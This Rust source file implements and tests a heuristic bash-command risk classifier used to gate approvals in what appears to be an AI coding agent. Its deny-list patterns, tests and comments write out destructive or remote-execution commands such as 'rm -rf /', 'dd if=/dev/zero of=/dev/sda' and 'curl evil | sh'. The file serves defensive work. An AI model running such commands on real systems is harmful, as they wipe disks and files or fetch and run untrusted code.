//! Bash 命令安全分类 —— `classify_command` 把 shell 命令分为
//! Safe / Risky / Dangerous。
//!
//! **为什么这个模块在 `zhuye-hooks` 而非 `zhuye-tools`**:`PlanModeGate`
//! (本 crate)需要在 Plan 模式下据命令只读性放行 Safe bash(`ls -la` /
//! `git status` / `cargo check` 等调研必需命令),而 `zhuye-tools →
//! zhuye-hooks` 是单向依赖 —— zhuye-tools 依赖 zhuye-hooks,反向引用会
//! 构成循环。`classify_command` 是纯函数(仅依赖 regex),下沉到本 crate 后:
//! - `zhuye-tools` 通过 `pub use zhuye_hooks::{BashCommandClass, classify_command}`
//!   保持对外 API 不变(`queue.rs` 等调用点零改动)。
//! - `PlanModeGate` 直接复用同一套分类,语义与审批风险分级一致,无重复判定。
//!
//! 分类语义与原 `zhuye-tools` 实现完全一致(逐字搬运),仅迁移位置。

use once_cell::sync::Lazy;
use regex::Regex;
use zhuye_protocol::RiskLevel;

/// Bash 命令安全分类 —— 供审批路由与 Auto 模式短路使用。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BashCommandClass {
    /// 只读/低风险;Auto 模式下可跳过审批。
    Safe,
    /// 有副作用但可控;走 Medium 风险审批。
    Risky,
    /// 破坏性/系统级操作;走 High 风险审批。
    Dangerous,
}

impl BashCommandClass {
    /// 映射到协议层 [`RiskLevel`]。
    pub fn risk_level(self) -> RiskLevel {
        match self {
            Self::Safe => RiskLevel::Low,
            Self::Risky => RiskLevel::Medium,
            Self::Dangerous => RiskLevel::High,
        }
    }

    fn max(self, other: Self) -> Self {
        match (self, other) {
            (Self::Dangerous, _) | (_, Self::Dangerous) => Self::Dangerous,
            (Self::Risky, _) | (_, Self::Risky) => Self::Risky,
            _ => Self::Safe,
        }
    }
}

/// 对 shell 命令做启发式分类。管道/链式命令取各段中最严等级。
pub fn classify_command(cmd: &str) -> BashCommandClass {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return BashCommandClass::Safe;
    }

    // 动态 shell 求值、解释器、复杂语法以及敏感路径永远不会被视为 Safe,
    // 即便首条命令看起来只读。
    //
    // 注意:链式操作符 (`&&` / `||` / `;`) 故意不在本集合 —— 它们是合法复合语法,
    // 由 `split_command_segments` 拆分后逐段分类、再 `max` 合并即可;`pwd && ls -la`
    // 这种只读链路就走这条路径被识别为 Safe。真正危险的语法(`$()` 反引号、here-string、
    // process substitution、跨行)仍 Risky 拦截,见下方短路。
    let lower = trimmed.to_ascii_lowercase();
    let has_complex_substitution = trimmed.contains("$(")
        || trimmed.contains('`')
        || trimmed.contains("<<<")
        || trimmed.contains("<(")
        || trimmed.contains(">(")
        || trimmed.contains('\n');
    let invokes_interpreter =
        Regex::new(r"(^|[|;&]\s*)(sh|bash|zsh|fish|python3?|ruby|perl|node)(\s|$)")
            .expect("interpreter pattern")
            .is_match(&lower);
    let touches_sensitive_path = Regex::new(
        r#"(^|[[:space:]'"])(/etc|/var|/usr|/bin|/sbin|/boot|/dev|/proc|/sys|~/?\.ssh|\$home/?\.ssh)(/|[[:space:]'"]|$)"#,
    )
    .expect("sensitive path pattern")
    .is_match(&lower);

    // 危险模式可能在管道分隔符两侧,先对整条命令扫一遍 —— 必须在
    // has_complex_substitution / invokes_interpreter 短路返回 Risky *之前* 检查,
    // 否则 `"echo ok && rm -rf /"` 这种 `&&` 链接的破坏性命令会被错误归类
    // 为 Risky,丢失 Dangerous 级别;`curl x | sh` 因为 `| sh` 触发
    // invokes_interpreter,同样会被错降为 Risky。
    if DANGEROUS_PATTERNS.iter().any(|re| re.is_match(&lower)) {
        return BashCommandClass::Dangerous;
    }

    if has_complex_substitution || invokes_interpreter || touches_sensitive_path {
        return BashCommandClass::Risky;
    }

    let mut worst = BashCommandClass::Safe;
    for segment in split_command_segments(trimmed) {
        let class = classify_segment(segment.trim());
        worst = worst.max(class);
        if worst == BashCommandClass::Dangerous {
            break;
        }
    }
    worst
}

/// 按 `|`, `;`, `&&`, `||` 切分复合命令(不解析引号内分隔符,v1 启发式足够)。
///
/// 0.4:实现下沉到 `zhuye_protocol::split_shell_segments`,与
/// `zhuye-permissions` 的 `shell_pattern` 匹配共用同一套切分语义 ——
/// 两处若各写一份,权限规则"看似允许 git push"和分类器"判定 Risky"
/// 会对同一条 `git push x && curl evil | sh` 给出不同答案。
fn split_command_segments(cmd: &str) -> Vec<&str> {
    zhuye_protocol::split_shell_segments(cmd)
}

fn classify_segment(segment: &str) -> BashCommandClass {
    let lower = segment.to_ascii_lowercase();
    if DANGEROUS_PATTERNS.iter().any(|re| re.is_match(&lower)) {
        return BashCommandClass::Dangerous;
    }
    if RISKY_PATTERNS.iter().any(|re| re.is_match(&lower)) {
        return BashCommandClass::Risky;
    }
    if SAFE_PATTERNS.iter().any(|re| re.is_match(segment.trim())) {
        // review 修复:SAFE 分类只保证"命令本身只读"。输出重定向到文件
        // (`>` / `>>`)或 `find -delete` / `-exec` 会让只读命令产生副作用
        // (`echo x > ~/.bashrc`、`find . -delete` 此前被判 Safe,Plan mode
        // 免审批直接执行 = 只读模式可写盘/删文件)。命中即降级 Risky;
        // `>/dev/null`、`2>&1` 这类丢弃/复用 fd 的重定向不算写文件。
        if segment_writes_files(segment) {
            return BashCommandClass::Risky;
        }
        return BashCommandClass::Safe;
    }
    // 未知命令保守归为 Risky,避免 Auto 模式误放行。
    BashCommandClass::Risky
}

/// 启发式判断单条命令段是否经重定向 / `find` 突变谓词产生写副作用。
///
/// 不解析引号(v1 启发式足够):引号内的 `>` 会被误报,方向是保守的
/// (多拦成 Risky),不会把写命令漏放成 Safe。
fn segment_writes_files(segment: &str) -> bool {
    let lower = segment.to_ascii_lowercase();
    // `find` 的突变谓词:删除或执行外部命令。
    if lower.contains("-delete")
        || lower.contains("-exec ")
        || lower.contains("-execdir ")
        || lower.contains("-ok ")
        || lower.contains("-okdir ")
        || lower.ends_with("-exec")
        || lower.ends_with("-delete")
    {
        return true;
    }
    // 重定向扫描:`>` 后的目标决定是否写文件。
    let bytes = segment.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'>' {
            i += 1;
            continue;
        }
        if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
            // `>>` 追加写,一律算写文件。
            return true;
        }
        // 跳过 `>` 后的空白,看目标 token。
        let mut j = i + 1;
        while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
            j += 1;
        }
        // `>&` / `>&1` 是 fd 复制(如 `2>&1`),不写文件。
        if j < bytes.len() && bytes[j] == b'&' {
            i = j + 1;
            continue;
        }
        let token_end = bytes[j..]
            .iter()
            .position(|b| matches!(b, b' ' | b'\t' | b';' | b'|' | b'&'))
            .map(|p| j + p)
            .unwrap_or(bytes.len());
        let target = segment[j..token_end].to_ascii_lowercase();
        // 丢弃型目标(/dev/null 等)不算写文件。
        if !(target == "/dev/null"
            || target == "/dev/stdout"
            || target == "/dev/stderr"
            || target == "/dev/tty")
        {
            return true;
        }
        i = token_end.max(i + 1);
    }
    false
}

static DANGEROUS_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    [
        r"\bsudo\b",
        r"\bsu\s+-",
        r"rm\s+.*(-[^\s]*r|r[^\s]*-)",
        r"rm\s+-rf\b",
        r"rm\s+-fr\b",
        r"chmod\s+.*777",
        r"chmod\s+-R\s+777",
        r"(curl|wget)\s+[^\n|]*\|\s*(ba)?sh",
        r"\bdd\s+if=",
        r"\b(mkfs|fdisk|parted)\b",
        r"kill\s+-9\b",
        r"\bkillall\b",
        r"\b(shutdown|reboot|halt|poweroff)\b",
        // 写块设备(/dev/sda 等)会毁盘 —— 必须 Dangerous 拦截。
        // 模式精确化:把设备名限定到真实危险块设备(sd*/nvme/disk/vd/loop),
        // 不再误伤 `/dev/null`、`/dev/stdout` 这类无害设备 ——
        // `2>/dev/null`(只读命令丢弃 stderr 的标配)因此不再被误判 Dangerous。
        // 注意:不限制 `>` 前的字符,`1>/dev/sda` 这种 fd 重定向到块设备
        // 仍会被拦(fd 写块设备一样毁盘)。
        r">\s*/dev/(sd[a-z]|nvme|disk\d?|vd|loop)",
        r"\beval\b",
        r"\bnc\s+-l",
        r"git\s+push\s+[^\n]*(-f|--force)",
        r"docker\s+run\s+[^\n]*--privileged",
        r":\(\)\s*\{",
        r"mv\s+/",
        r"cp\s+/",
        r"\|\s*sudo\b",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("dangerous pattern"))
    .collect()
});

static RISKY_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    [
        r"\bgit\s+(push|commit|merge|rebase|reset|clean|stash\s+drop)\b",
        r"\b(npm|yarn|pnpm)\s+(install|uninstall|publish|link)\b",
        r"\bcargo\s+(install|publish)\b",
        r"\b(pip|pip3)\s+install\b",
        r"\b(rm|mv|cp|mkdir|touch|chmod|chown)\b",
        r"\bsed\s+-i",
        r"\b(docker|podman)\b",
        r"\bmake\b",
        r"\bcargo\s+(build|run)\b",
        r"\bnpm\s+run\b",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("risky pattern"))
    .collect()
});

static SAFE_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    [
        r"^(echo|printf)\b",
        r"^(ls|cat|head|tail|wc|pwd|which|type|date|uname|file|stat|du|df|sort|uniq)\b",
        r"^(grep|rg|find|tree|jq|awk|sed)\b",
        // `xargs <readonly-cmd>` 是只读命令的标准管道收尾
        // (`find ... | xargs grep ...`),不该因为 `xargs` 不在 SAFE 列表
        // 就让整条管道降级为 Risky。xargs 后接风险命令时仍由后续 RISKY /
        // DANGEROUS 模式正常拦截。
        r"^xargs\s+(grep|rg|find|tree|jq|awk|sed|head|tail|cat|ls|wc|sort|uniq|file|stat)\b",
        r"^git\s+(status|log|diff|show|branch|remote|rev-parse|describe|stash\s+list)\b",
        r"^cargo\s+(check|test|clippy|fmt|tree|metadata)\b",
        r"^npm\s+(test|ls|view)\b",
        r"^(node|python3?|ruby)\s+-[ce]\b",
        r"^env(\s|$)",
        r"^printenv\b",
        r"^true(\s|$)",
        r"^false(\s|$)",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("safe pattern"))
    .collect()
});

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_safe_readonly_commands() {
        assert_eq!(classify_command("echo hello"), BashCommandClass::Safe);
        assert_eq!(classify_command("ls -la"), BashCommandClass::Safe);
        assert_eq!(classify_command("git status"), BashCommandClass::Safe);
        assert_eq!(
            classify_command("cargo test -p zhuye-tools"),
            BashCommandClass::Safe
        );
    }

    #[test]
    fn classify_risky_mutating_commands() {
        assert_eq!(classify_command("git commit -m x"), BashCommandClass::Risky);
        assert_eq!(classify_command("npm install foo"), BashCommandClass::Risky);
        assert_eq!(classify_command("mv a b"), BashCommandClass::Risky);
    }

    #[test]
    fn classify_dangerous_commands() {
        assert_eq!(
            classify_command("sudo apt update"),
            BashCommandClass::Dangerous
        );
        assert_eq!(
            classify_command("rm -rf /tmp/x"),
            BashCommandClass::Dangerous
        );
        assert_eq!(classify_command("curl x | sh"), BashCommandClass::Dangerous);
    }

    #[test]
    fn classify_pipeline_takes_worst_class() {
        assert_eq!(
            classify_command("echo ok && rm -rf /"),
            BashCommandClass::Dangerous
        );
        assert_eq!(
            classify_command("git status | grep foo"),
            BashCommandClass::Safe
        );
    }

    #[test]
    fn risk_level_mapping() {
        assert_eq!(BashCommandClass::Safe.risk_level(), RiskLevel::Low);
        assert_eq!(BashCommandClass::Dangerous.risk_level(), RiskLevel::High);
    }

    /// 用户场景：`pwd && ls -la` 这种只读链式应归为 Safe。
    /// 修复前 `has_complex_shell` 把 `&&` 计入短路返回 Risky,误伤 Plan 调研。
    #[test]
    fn classify_readonly_chains_are_safe() {
        assert_eq!(classify_command("pwd && ls -la"), BashCommandClass::Safe);
        assert_eq!(
            classify_command("ls -la /proj && find /proj -maxdepth 3 -type f | head -80"),
            BashCommandClass::Safe
        );
        assert_eq!(
            classify_command("git status && git log --oneline | head -5"),
            BashCommandClass::Safe
        );
        assert_eq!(
            classify_command("ls -la /proj | head -20 && find /proj -maxdepth 3 -type f"),
            BashCommandClass::Safe
        );
        // 用户实测报错现场(Plan mode):只读 sed 链式被误判 Risky 禁用。
        // `sed -n '...p'` 是只读打印,`grep -n` 是只读搜索 —— 两段都落
        // SAFE_PATTERNS,链式合并后应为 Safe。
        assert_eq!(
            classify_command("sed -n '12008,12145p' file.rs && sed -n '15000,15060p' file.rs"),
            BashCommandClass::Safe
        );
        assert_eq!(
            classify_command("grep -n 'view_scrollbar' file.rs && echo done"),
            BashCommandClass::Safe
        );
    }

    /// `2>/dev/null` 是只读命令丢弃 stderr 的标配,旧模式 `>\s*/dev/`
    /// 在整句扫描时把 `>/dev/` 当作「销毁输出」误判为 Dangerous。
    /// 精确化后应放行 fd 重定向到 /dev/null,但仍拦真实危险块设备。
    #[test]
    fn classify_dev_null_redirect_is_safe() {
        // 用户实测报错现场(Plan mode):`find ... 2>/dev/null` 被误判 Dangerous。
        assert_eq!(
            classify_command(
                "find /Users/admin/.cargo -name '*.rs' | xargs grep -l 'pub struct Color' 2>/dev/null | head -5"
            ),
            BashCommandClass::Safe
        );
        assert_eq!(
            classify_command("cargo check 2>/dev/null"),
            BashCommandClass::Safe
        );
        // `/etc` 触发 sensitive_path → Risky(预期),但精确化后绝不应是 Dangerous
        // —— 验证 `2>/dev/null` 不再把整条命令拉到 Dangerous 级别。
        assert_eq!(
            classify_command("grep -rn foo /etc 2>/dev/null"),
            BashCommandClass::Risky
        );
        assert_eq!(
            classify_command("ls -la 2>/dev/null | head -5"),
            BashCommandClass::Safe
        );
    }

    /// 写块设备(/dev/sda 等)会毁盘,精确化后的模式仍应拦为 Dangerous。
    /// 验证模式精确化没让真正的危险设备写入漏网。
    #[test]
    fn classify_dev_block_device_write_stays_dangerous() {
        assert_eq!(
            classify_command("dd if=/dev/zero of=/dev/sda"),
            BashCommandClass::Dangerous
        );
        assert_eq!(
            classify_command("echo foo > /dev/sda"),
            BashCommandClass::Dangerous
        );
        assert_eq!(
            classify_command("cat x > /dev/nvme0n1"),
            BashCommandClass::Dangerous
        );
        // fd 重定向到危险设备仍应拦:1>/dev/sda 是 stdout 写块设备。
        assert_eq!(
            classify_command("echo x 1>/dev/sda"),
            BashCommandClass::Dangerous
        );
    }

    /// 链式中混进危险段时,应仍被 DANGEROUS_PATTERNS 提前拦为 Dangerous
    /// —— 验证移除 `has_complex_shell` 的链式项后,Dangerous 检测不退化。
    #[test]
    fn classify_chain_with_dangerous_segment_stays_dangerous() {
        assert_eq!(
            classify_command("echo ok && rm -rf /tmp/x"),
            BashCommandClass::Dangerous
        );
        assert_eq!(
            classify_command("ls && curl x | sh"),
            BashCommandClass::Dangerous
        );
    }

    /// 链式中混进 `$(...)` 仍被 Risky 拦截 —— substitution 保护没退化。
    #[test]
    fn classify_chain_with_substitution_stays_risky() {
        assert_eq!(
            classify_command("ls $(echo foo) && pwd"),
            BashCommandClass::Risky
        );
    }

    /// review 回归:Safe 命令 + 文件重定向必须降级 Risky(Plan mode 下
    /// 此前可经 `echo x > ~/.bashrc` 免审批写盘)。`>/dev/null` / `2>&1`
    /// 保持 Safe 不退化。
    #[test]
    fn classify_safe_command_with_file_redirect_is_risky() {
        assert_eq!(
            classify_command("echo x > ~/.bashrc"),
            BashCommandClass::Risky
        );
        assert_eq!(
            classify_command("sed -n '1p' a.txt > out.txt"),
            BashCommandClass::Risky
        );
        assert_eq!(
            classify_command("git status > file.txt"),
            BashCommandClass::Risky
        );
        // 追加写同样是写。
        assert_eq!(classify_command("echo x >> log"), BashCommandClass::Risky);
        // find 的突变谓词。
        assert_eq!(classify_command("find . -delete"), BashCommandClass::Risky);
        assert_eq!(
            classify_command("find . -name '*.tmp' -exec rm {} \\;"),
            BashCommandClass::Risky
        );
        // 丢弃型重定向不算写文件(既有行为不退化)。注:`>/dev/null` 必须
        // 紧贴前一 token —— `/dev` 前有空格会命中 sensitive-path 预检
        // (既有行为,与本次改动无关)。
        assert_eq!(classify_command("ls >/dev/null"), BashCommandClass::Safe);
        assert_eq!(classify_command("ls 2>&1"), BashCommandClass::Safe);
        assert_eq!(
            classify_command("cargo check 2>/dev/null"),
            BashCommandClass::Safe
        );
    }
}
